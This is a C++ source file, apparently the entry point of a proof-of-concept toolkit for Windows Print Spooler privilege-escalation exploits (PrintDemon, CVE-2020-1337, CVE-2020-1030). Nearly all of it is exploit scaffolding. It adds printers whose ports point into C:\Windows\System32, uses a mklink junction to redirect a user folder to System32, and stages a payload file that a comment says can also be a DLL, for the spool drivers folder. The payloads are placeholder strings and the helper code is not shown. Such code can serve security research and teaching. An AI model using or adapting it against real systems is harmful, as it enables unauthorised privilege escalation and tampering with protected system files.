#include <iostream>
#include <Windows.h>

#include "printers.h"
#include "utils.h"; 
#include "exploits.h"

struct PrinterExploitInfo {
	wchar_t *driverName, *portName, *printerName; 
	PrinterExploitInfo(wchar_t* driverName, wchar_t* portName, wchar_t* printerName)
		: driverName(driverName), portName(portName), printerName(printerName) {}
};

void cve_2020_1337_init(bool isRestarted) {
	PrinterExploitInfo printDemonInfo(
		const_cast<wchar_t*>(L"Generic / Text Only"),
		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
		const_cast<wchar_t*>(L"print_demon"));

	if (!isRestarted) {
		bool isCreatedTmp = CreateDirectoryW(L"C:\\Users\\User\\Desktop\\tmp", NULL);
		if (!isCreatedTmp) {
			std::cout << "[-] Tmp dir ERROR :" << GetLastError() << std::endl;
			system("pause");
			return;
		}
		std::cout << "[+] Tmp dir created !\n";


		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
		DWORD portResult = AddPort(printDemonInfo.portName);
		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
		ClosePrinter(hPrinter);

		bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\User\\Desktop\\tmp");
		if (!isRemovedTmp) {
			std::cout << "[-] Removed directory ERROR: " << GetLastError();
			system("pause");
			return;
		}
		std::cout << "[+] Tmp dir correctly removed !\n";

		// create junction directory
		system("cmd /c mklink  /J \"C:\\Users\\User\\Desktop\\tmp\" \"C:\\Windows\\System32\"");
	}

	std::string payload = "Hello, CVE_2020_1337";
	print_demon(printDemonInfo.printerName, payload, isRestarted);
}

void print_demon_init(bool isRestarted) {
	PrinterExploitInfo printDemonInfo(
		const_cast<wchar_t*>(L"Generic / Text Only"),
		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
		const_cast<wchar_t*>(L"print_demon"));

	if (!isRestarted) {
		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
		DWORD portResult = AddPort(printDemonInfo.portName);
		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
		ClosePrinter(hPrinter);
	}

	std::string payload = "Hello, PrintDemon";
	print_demon(printDemonInfo.printerName, payload, isRestarted);
}

void cve_2020_1030_init(bool isRestarted) {
	PrinterExploitInfo cve_2020_1030Info(
		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
		const_cast<wchar_t*>(L"PORTPROMPT:"),
		const_cast<wchar_t*>(L"cve_2020_1030_printer"));

	if (!isRestarted) {
		HRESULT driverResult = AddDriver(cve_2020_1030Info.driverName);
		DWORD portResult = AddPort(cve_2020_1030Info.portName);
		HANDLE hPrinter = AddPrinter(cve_2020_1030Info.printerName, cve_2020_1030Info.driverName, cve_2020_1030Info.portName);
		ClosePrinter(hPrinter);
	}
	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted);
}

int main(int argc, wchar_t* argv[]) {

	bool isRestarted = isAppStartedFromReboot(argc, argv);
		
	// print_demon_init(isRestarted); 
	// cve_2020_1337_init(isRestarted); 
	
	// cve_2020_1030_init(isRestarted); 


	system("pause"); 
	return 0; 
}

